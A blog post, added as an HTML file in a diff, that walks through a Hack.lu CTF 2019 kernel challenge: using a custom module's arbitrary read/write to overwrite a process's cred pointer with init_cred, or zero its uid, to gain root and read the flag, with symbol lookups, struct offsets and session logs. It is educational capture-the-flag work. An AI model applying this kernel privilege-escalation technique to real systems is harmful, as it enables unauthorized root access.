@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author"
+    content="Adam ">
+<meta name="description"
+    content="Baby Kernel 2 - pwn , 202 pts, solves: 68 
+This post is a follow up to a quick writeup that I&amp;rsquo;ve posted on my github.
+We are provided with a minimal kernel environment containing custom kernel module and client that communicates with it.
+Having read/write primitive in kernel space we can escalate our privileges by changing cred field of the task_struct of our current task. Provided System.map file contains all symbols from the target kernel:" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://asimuntis.github.io/posts/2019/10/hack.lu-ctf-2019-baby-kernel-2/" />
+
+
+<title>
+    
+    Hack.Lu CTF 2019: Baby kernel 2 ::   — asimuntis.github.io
+    
+</title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://asimuntis.github.io/main.min.4d80d700c861a83e005baae4d8947d8c68519d671b71f700317d1dcbe008b2b8.css">
+
+
+
+
+<link rel="apple-touch-icon" sizes="180x180" href="https://asimuntis.github.io/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://asimuntis.github.io/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://asimuntis.github.io/favicon-16x16.png">
+<link rel="manifest" href="https://asimuntis.github.io/site.webmanifest">
+<link rel="mask-icon" href="https://asimuntis.github.io/safari-pinned-tab.svg" color="#252627">
+<link rel="shortcut icon" href="https://asimuntis.github.io/favicon.ico">
+<meta name="msapplication-TileColor" content="#252627">
+<meta name="theme-color" content="#252627">
+
+<meta itemprop="name" content="Hack.Lu CTF 2019: Baby kernel 2">
+<meta itemprop="description" content="Baby Kernel 2 - pwn , 202 pts, solves: 68 
+This post is a follow up to a quick writeup that I&rsquo;ve posted on my github.
+We are provided with a minimal kernel environment containing custom kernel module and client that communicates with it.
+Having read/write primitive in kernel space we can escalate our privileges by changing cred field of the task_struct of our current task. Provided System.map file contains all symbols from the target kernel:">
+
+
+<meta itemprop="datePublished" content="2019-10-29T20:38:02&#43;00:00" />
+<meta itemprop="dateModified" content="2019-10-29T20:38:02&#43;00:00" />
+<meta itemprop="wordCount" content="1125">
+
+
+
+<meta itemprop="keywords" content="pwn,kernel," />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://asimuntis.github.io/"/>
+
+<meta name="twitter:title" content="Hack.Lu CTF 2019: Baby kernel 2"/>
+<meta name="twitter:description" content="Baby Kernel 2 - pwn , 202 pts, solves: 68 
+This post is a follow up to a quick writeup that I&rsquo;ve posted on my github.
+We are provided with a minimal kernel environment containing custom kernel module and client that communicates with it.
+Having read/write primitive in kernel space we can escalate our privileges by changing cred field of the task_struct of our current task. Provided System.map file contains all symbols from the target kernel:"/>
+
+
+
+<meta property="article:section" content="exploitation" />
+
+<meta property="article:published_time" content="2019-10-29 20:38:02 &#43;0000 UTC" />
+
+
+
+
+
+
+
+    </head>
+
+    <body class="">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+    <div></div>
+       
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://asimuntis.github.io/">/home/adam</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            <p>
+            
+
+            </p>
+        </div>
+
+        <article>
+            <h1 class="post-title"><a href="https://asimuntis.github.io/posts/2019/10/hack.lu-ctf-2019-baby-kernel-2/">Hack.Lu CTF 2019: Baby kernel 2</a></h1>
+
+            <div class="post-info">
+                <p>
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://asimuntis.github.io/tags/pwn">pwn</a></span><span class="tag"><a href="https://asimuntis.github.io/tags/kernel">kernel</a></span>
+                </p>
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>October 29, 2019</p>
+            </div>
+            <hr />
+
+            
+
+            <div class="post-content">
+                
+
+<h2 id="baby-kernel-2-pwn-202-pts-solves-68">Baby Kernel 2 - pwn , 202 pts, solves: 68</h2>
+
+<p><br>
+This post is a follow up to a quick <a href="https://github.com/asimuntis/writeups/blob/master/hack.lu-2019/baby-kernel-2.md" target="_blank">writeup</a> that I&rsquo;ve posted on my github.</p>
+
+<p>We are provided with a minimal kernel environment containing custom kernel module and client that communicates with it.</p>
+
+<p>Having <code>read/write</code> primitive in kernel space we can escalate our privileges by changing <code>cred</code> field of the <code>task_struct</code> of our current task. Provided <code>System.map</code> file contains all symbols from the target kernel:</p>
+
+<p>Obtaining <code>current_task</code> address:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">➤ grep <span style="color:#e6db74">&#39;D current_task&#39;</span> System.map  
+ffffffff8183a040 D current_task</code></pre></div>
+<p>Alternatively, we can read symbols directly from the kernel image:<br />
+(I have used <a href="https://raw.githubusercontent.com/torvalds/linux/master/scripts/extract-vmlinux" target="_blank">this</a> tool to decompress the kernel image.)</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">➤ readelf -Ws vmlinux | grep current_task
+ <span style="color:#ae81ff">2165</span>: ffffffff816d4df0     <span style="color:#ae81ff">0</span> NOTYPE  LOCAL  DEFAULT    <span style="color:#ae81ff">6</span> __ksymtab_current_task
+ <span style="color:#ae81ff">2166</span>: ffffffff816db115    <span style="color:#ae81ff">13</span> OBJECT  LOCAL  DEFAULT    <span style="color:#ae81ff">8</span> __kstrtab_current_task
+<span style="display:block;width:100%;background-color:#3c3d38"><span style="color:#ae81ff">20328</span>: ffffffff8183a040     <span style="color:#ae81ff">8</span> OBJECT  GLOBAL DEFAULT   <span style="color:#ae81ff">11</span> current_task</span></code></pre></div>
+
+<p>Let&rsquo;s test if we can read from the <code>current_task</code> address:</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-hl_lines=16" data-lang="hl_lines=16">----- Menu -----
+1. Read
+2. Write
+3. Show me my uid
+4. Read file
+5. Any hintz?
+6. Bye!
+&gt; 1
+1
+I need an address to read from. Choose wisely
+&gt; 
+0xffffffff8183a040
+0xffffffff8183a040
+Got everything I need. Let&#39;s do it!
+flux_baby_2 ioctl nr 901 called
+We&#39;re back. Our scouter says the power level is: ffff888003372300</code></pre></div>
+
+<p>We have obtained <code>task_struct</code> address from the <code>current_task</code>. Now we have to get the offset to the <code>task_struct-&gt;cred</code> (<code>struct cred *cred</code>):</p>
+
+<p><mark><a href="https://github.com/torvalds/linux/blob/master/include/linux/sched.h#L624" target="_blank">linux/sched.h#L624</a></mark></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">struct</span> task_struct {
+
+	(...)
+	
+	<span style="color:#75715e">/* Objective and real subjective task credentials (COW): */</span>
+	<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> cred __rcu		<span style="color:#f92672">*</span>real_cred;
+
+	<span style="color:#75715e">/* Effective (overridable) subjective task credentials (COW): */</span>
+	<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> cred __rcu		<span style="color:#f92672">*</span>cred;</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  ptype <span style="color:#f92672">/</span>o <span style="color:#66d9ef">struct</span> task_struct
+<span style="color:#75715e">/* offset    |  size */</span>  type <span style="color:#f92672">=</span> <span style="color:#66d9ef">struct</span> task_struct {
+<span style="color:#75715e">/*    0      |    16 */</span>    <span style="color:#66d9ef">struct</span> thread_info {
+<span style="color:#75715e">/*    0      |     8 */</span>        <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> flags;
+
+...
+
+<span style="color:#75715e">/* 1016      |     8 */</span>    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> cred <span style="color:#f92672">*</span>real_cred;
+<span style="color:#75715e">/* 1024      |     8 */</span>    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> cred <span style="color:#f92672">*</span>cred;</code></pre></div>
+<p>To escalate privileges to root we have to overwrite <code>task_struct-&gt;cred</code> at offset <code>0x400</code> (1024) with the the pointer to the <code>init_cred</code> struct, which contains credentials of the <code>init</code> process that is running as <code>root</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">➤ readelf -Ws vmlinux | grep init_cred      
+ <span style="color:#ae81ff">21812</span>: ffffffff8183f4c0   <span style="color:#ae81ff">120</span> OBJECT  GLOBAL DEFAULT   <span style="color:#ae81ff">11</span> init_cred</code></pre></div>
+<p><mark><a href="https://github.com/torvalds/linux/blob/39a38bcba4ab6e5285b07675b0e42c96eec35e67/kernel/cred.c#L41" target="_blank">kernel/cred.c#L41</a></mark></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/*
+</span><span style="color:#75715e"> * The initial credentials for the initial task
+</span><span style="color:#75715e"> */</span>
+<span style="color:#66d9ef">struct</span> cred init_cred <span style="color:#f92672">=</span> {
+	.usage			<span style="color:#f92672">=</span> ATOMIC_INIT(<span style="color:#ae81ff">4</span>),
+<span style="color:#75715e">#ifdef CONFIG_DEBUG_CREDENTIALS
+</span><span style="color:#75715e"></span>	.subscribers		<span style="color:#f92672">=</span> ATOMIC_INIT(<span style="color:#ae81ff">2</span>),
+	.magic			<span style="color:#f92672">=</span> CRED_MAGIC,
+<span style="color:#75715e">#endif
+</span><span style="color:#75715e"></span>	.uid			<span style="color:#f92672">=</span> GLOBAL_ROOT_UID,
+	.gid			<span style="color:#f92672">=</span> GLOBAL_ROOT_GID,
+	.suid			<span style="color:#f92672">=</span> GLOBAL_ROOT_UID,
+	.sgid			<span style="color:#f92672">=</span> GLOBAL_ROOT_GID,
+	.euid			<span style="color:#f92672">=</span> GLOBAL_ROOT_UID,
+	.egid			<span style="color:#f92672">=</span> GLOBAL_ROOT_GID,
+	.fsuid			<span style="color:#f92672">=</span> GLOBAL_ROOT_UID,
+	.fsgid			<span style="color:#f92672">=</span> GLOBAL_ROOT_GID,</code></pre></div>
+<p><kds>The final plan:</kdb></p>
+
+<ul class="task-list">
+<li><label><input type="checkbox" checked disabled class="task-list-item"> read <code>task_struct</code> from <code>current_task</code></label></li>
+<li><label><input type="checkbox" checked disabled class="task-list-item"> read <code>task_struct-&gt;cred</code> (<code>struct cred *cred</code>) from <code>task_struct + 0x400</code></label></li>
+<li><label><input type="checkbox" checked disabled class="task-list-item"> overwrite <code>task_struct-&gt;cred</code> with <code>init_cred</code></label></li>
+</ul>
+
+<p>What is left to do is to spawn a shell with the new credentials - or like in our case, just use <code>Read file</code> function that is now running with <code>root</code> pivileges:</p>
+
+<pre><code>----- Menu -----
+1. Read
+2. Write
+3. Show me my uid
+4. Read file
+5. Any hintz?
+6. Bye!
+&gt; 1
+1
+I need an address to read from. Choose wisely
+&gt; 
+0xffffffff8183a040 &lt;- current_task
+0xffffffff8183a040
+Got everything I need. Let's do it!
+flux_baby_2 ioctl nr 901 called
+We're back. Our scouter says the power level is: ffff888003373480 &lt;- task_struct
+</code></pre>
+
+<blockquote>
+<p>task_struct @ 0xffff888003373480<br />
+task_struct-&gt;cred @ 0xffff888003373480+0x400</p>
+</blockquote>
+
+<pre><code>----- Menu -----
+1. Readrandom: fast init done
+
+2. Write
+3. Show me my uid
+4. Read file
+5. Any hintz?
+6. Bye!
+&gt; 2
+2
+I need an offset to write to. Choose wisely - seriously now...
+&gt; 
+0xffff888003373880     &lt;-- task_struct-&gt;cred
+0xffff888003373880
+What about a value?
+&gt; 
+0xffffffff8183f4c0     &lt;-- init_cred
+0xffffffff8183f4c0
+Thanks, boss. I can't believe we're doing this!
+flux_baby_2 ioctl nr 902 called
+Amazingly, we're back again.
+</code></pre>
+
+<blockquote>
+<p>task_struct-&gt;cred = init_cred</p>
+</blockquote>
+
+<pre><code>----- Menu -----
+1. Read
+2. Write
+3. Show me my uid
+4. Read file
+5. Any hintz?
+6. Bye!
+&gt; 3
+3
+uid=0(root) gid=0(root)
+
+----- Menu -----
+1. Read
+2. Write
+3. Show me my uid
+4. Read file
+5. Any hintz?
+6. Bye!
+&gt; 4 
+4 
+Which file are we trying to read?
+&gt; /flag
+/flag
+Here are your 0x35 bytes contents: 
+flag{nicely_done_this_is_how_a_privesc_can_also_go}}
+</code></pre>
+
+<h2 id="alternative-approach">Alternative approach</h2>
+
+<p>Instead of pointing the <code>task_struct-&gt;cred</code> to the <code>init_cred</code>, we could manually modify certain fields of the <code>struct cred *cred</code>. We know that we can obtain <code>struct cred</code> address from the <code>task_struct-&gt;cred</code>.</p>
+
+<p>Let&rsquo;s redo everything step by step. <br /></p>
+
+<p>Reading <code>task_struct</code> address from <code>current_task</code>:</p>
+
+<pre><code>I need an address to read from. Choose wisely
+&gt; 
+0xffffffff8183a040 &lt;- current_task
+Got everything I need. Let's do it!
+flux_baby_2 ioctl nr 901 called
+We're back. Our scouter says the power level is: ffff888003371180 &lt;- task_struct
+</code></pre>
+
+<p>Our <code>task_struct</code> address is <code>0xffff888003371180</code>. Now we can obtain the address of the <code>struct cred *cred</code> that is referenced in the <code>task_struct</code> at offset <code>0x400</code>.  Let&rsquo;s read <code>0xffff888003371180+0x400</code></p>
+
+<pre><code>I need an address to read from. Choose wisely
+&gt; 
+0xffff888003371580 &lt;- task_struct + 0x400
+Got everything I need. Let's do it!
+flux_baby_2 ioctl nr 901 called
+We're back. Our scouter says the power level is: ffff888003393400 &lt;- stuct cred
+</code></pre>
+
+<p>We know that <code>struct cred *cred</code> is at <code>0xffff888003393400</code>.</p>
+
+<p><mark><a href="https://github.com/torvalds/linux/blob/master/include/linux/cred.h#L111" target="_blank">linux/cred.h#L111</a></mark></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">struct</span> cred {
+	atomic_t	usage;
+<span style="color:#75715e">#ifdef CONFIG_DEBUG_CREDENTIALS
+</span><span style="color:#75715e"></span>	atomic_t	subscribers;	<span style="color:#75715e">/* number of processes subscribed */</span>
+	<span style="color:#66d9ef">void</span>		<span style="color:#f92672">*</span>put_addr;
+	<span style="color:#66d9ef">unsigned</span>	magic;
+<span style="color:#75715e">#define CRED_MAGIC	0x43736564
+</span><span style="color:#75715e">#define CRED_MAGIC_DEAD	0x44656144
+</span><span style="color:#75715e">#endif
+</span><span style="color:#75715e"></span>	kuid_t		uid;		<span style="color:#75715e">/* real UID of the task */</span>
+	kgid_t		gid;		<span style="color:#75715e">/* real GID of the task */</span>
+	kuid_t		suid;		<span style="color:#75715e">/* saved UID of the task */</span>
+	kgid_t		sgid;		<span style="color:#75715e">/* saved GID of the task */</span>
+	kuid_t		euid;		<span style="color:#75715e">/* effective UID of the task */</span>
+	kgid_t		egid;		<span style="color:#75715e">/* effective GID of the task */</span>
+	kuid_t		fsuid;		<span style="color:#75715e">/* UID for VFS ops */</span>
+	kgid_t		fsgid;		<span style="color:#75715e">/* GID for VFS ops */</span></code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">gef<span style="color:#960050;background-color:#1e0010">➤</span>  ptype <span style="color:#f92672">/</span>o <span style="color:#66d9ef">struct</span> cred
+<span style="color:#75715e">/* offset    |  size */</span>  type <span style="color:#f92672">=</span> <span style="color:#66d9ef">struct</span> cred {
+<span style="color:#75715e">/*    0      |     4 */</span>    atomic_t usage;
+<span style="color:#75715e">/*    4      |     4 */</span>    kuid_t uid;
+<span style="color:#75715e">/*    8      |     4 */</span>    kgid_t gid;
+<span style="color:#75715e">/*   12      |     4 */</span>    kuid_t suid;
+<span style="color:#75715e">/*   16      |     4 */</span>    kgid_t sgid;
+<span style="color:#75715e">/*   20      |     4 */</span>    kuid_t euid;
+<span style="color:#75715e">/*   24      |     4 */</span>    kgid_t egid;
+<span style="color:#75715e">/*   28      |     4 */</span>    kuid_t fsuid;
+<span style="color:#75715e">/*   32      |     4 */</span>    kgid_t fsgid;
+<span style="color:#75715e">/*   36      |     4 */</span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> securebits;
+<span style="color:#75715e">/*   40      |     8 */</span>    kernel_cap_t cap_inheritable;
+<span style="color:#75715e">/*   48      |     8 */</span>    kernel_cap_t cap_permitted;
+<span style="color:#75715e">/*   56      |     8 */</span>    kernel_cap_t cap_effective;
+<span style="color:#75715e">/*   64      |     8 */</span>    kernel_cap_t cap_bset;
+<span style="color:#75715e">/*   72      |     8 */</span>    kernel_cap_t cap_ambient;</code></pre></div>
+<p>Now we can set, for example <code>cred-&gt;uid</code> field at offset <code>4</code>, to <code>0</code> (root):</p>
+
+<pre><code>I need an offset to write to. Choose wisely - seriously now...
+&gt; 
+0xffff888003389704 &lt;- struct cred + 4
+What about a value?
+&gt; 
+0
+Thanks, boss. I can't believe we're doing this!
+flux_baby_2 ioctl nr 902 called
+Amazingly, we're back again.
+----- Menu -----
+1. Read
+2. Write
+3. Show me my uid
+4. Read file
+5. Any hintz?
+6. Bye!
+&gt; 3
+uid=0(root) gid=0(root) euid=1000(user) egid=1000(user) groups=1000(user)
+
+</code></pre>
+
+<p>That&rsquo;s it! Thanks</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+        </div>
+
+        
+            <div class="pagination">
+                <div class="pagination__title">
+                    <span class="pagination__title-h"></span>
+                    
+                </div>
+
+                <div class="pagination__buttons">
+                    
+
+                    
+                        <span class="button next">
+                            <a href="https://asimuntis.github.io/posts/2019/04/%C3%A5ngstromctf-2019/">
+                                <span class="button__text">ångstromCTF 2019</span>
+                                <span class="button__icon">→</span>
+                            </a>
+                        </span>
+                    
+                </div>
+            </div>
+        
+
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+                <div>
+                    &nbsp; <a href="https://twitter.com/adamsimuntis" target="_blank" rel="noopener" title="Twitter"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-twitter"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg></a> &nbsp;&nbsp; <a href="https://github.com/asimuntis" target="_blank" rel="noopener" title="Github"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg></a> &nbsp;
+                </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="https://asimuntis.github.io/bundle.min.9e52e68b082cf2a30a7fead88260edb8818fbd7f7831e39674917d4539ec75df41ba88eaddfbd916594ab4fb2a31913b46cf2d6094cf80381edb8c632512a8ca.js" integrity="sha512-nlLmiwgs8qMKf&#43;rYgmDtuIGPvX94MeOWdJF9RTnsdd9Buojq3fvZFllKtPsqMZE7Rs8tYJTPgDge24xjJRKoyg=="></script>
+
+
+
+    </body>
+</html>
